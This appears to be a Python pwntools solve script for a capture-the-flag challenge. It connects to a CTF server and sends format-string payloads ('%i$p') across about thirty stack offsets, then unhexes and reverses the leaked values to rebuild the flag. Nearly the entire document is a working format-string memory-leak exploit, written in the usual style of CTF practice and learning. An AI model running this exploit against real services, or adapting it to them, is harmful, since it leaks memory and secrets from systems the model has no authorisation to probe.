#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host = 'cat.hsctf.com'
port = 1337

# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(0, 30): # Range is obtained by fuzzing locally 
    try:
        # io = process(exe)
        # Connect to server
        io = remote(host, port)
        # Format the payload to location on stack
        io.sendline(f'%{i}$p'.encode())
        # receive leaked
        leak = io.recvline()
        # ignore nulls
        if not b'(nil)' in leak:
            # print value if exist
            print(f'stack at-{i}' + ": " + str(leak))
            try:
                # unhex and decode leaked
                hexform = unhex(leak.split()[0][2:].decode())
                # append to flag and reverse endianess
                flag += hexform.decode()[::-1]
                # confirmation
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(f'{flag=}')